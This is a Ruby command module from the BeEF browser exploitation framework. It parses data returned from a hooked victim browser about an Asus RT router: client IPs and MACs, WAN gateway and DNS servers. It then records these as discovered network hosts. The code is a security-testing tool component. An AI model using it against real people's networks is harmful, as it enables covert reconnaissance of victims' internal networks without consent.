#
# Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Asus_rt_series_get_info < BeEF::Core::Command

  def self.options
    return [
      { 'name' => 'target_ip', 'ui_label' => 'Target IP', 'value' => '192.168.1.1' }
    ]
  end

  def post_execute
    save({'result' => @datastore['result']})

    configuration = BeEF::Core::Configuration.instance
    if configuration.get("beef.extension.network.enable") == true

      session_id = @datastore['beefhook']
      cid = @datastore['cid'].to_i

      # log the network hosts
      if @datastore['results'] =~ /ip=(.+)&clients=(.+)&wanip=(.+)&netmask=(.+)&gateway=(.+)&dns=(.+)/
        ip = "#{$1}"
        clients = "#{$2}"
        wanip = "#{$3}"
        netmask = "#{$4}"
        gateway = "#{$5}"
        dns_servers = "#{$6}"

        if !ip.nil?
          print_debug("Hooked browser found Asus RT series router [ip: #{ip}]")
          r = BeEF::Core::Models::NetworkHost.new(:hooked_browser_id => session_id, :ip => ip, :type => 'Asus Router', :cid => cid)
          r.save
          r = BeEF::Core::Models::NetworkService.new(:hooked_browser_id => session_id, :proto => 'http', :ip => ip, :port => 80, :type => 'HTTP Server', :cid => cid)
          r.save
        end
        clients.scan(/([\d\.]+,[:\dA-F]{17})/).flatten.each do |client|
          next if client.nil?
          if client.to_s =~ /^([\d\.]+),([:\dA-F]{17})$/
            ip = $1
            mac = $2
            print_debug("Hooked browser found router client [ip: #{ip}, mac: #{mac}]")
            r = BeEF::Core::Models::NetworkHost.new(:hooked_browser_id => session_id, :ip => ip, :mac => mac, :cid => cid)
            r.save
          end
        end
        if !gateway.nil?
          print_debug("Hooked browser found WAN gateway server [ip: #{gateway}]")
          r = BeEF::Core::Models::NetworkHost.new(:hooked_browser_id => session_id, :ip => gateway, :type => 'WAN Gateway', :cid => cid)
          r.save
        end
        if !dns_servers.nil? && dns_servers =~ /^([\d\. ]+)$/
          dns_servers.split(/ /).uniq.each do |dns|
            print_debug("Hooked browser found DNS server [ip: #{dns}]")
            r = BeEF::Core::Models::NetworkHost.new(:hooked_browser_id => session_id, :ip => dns, :type => 'DNS Server', :cid => cid)
            r.save
          end
        end
      end
    end

  end

end

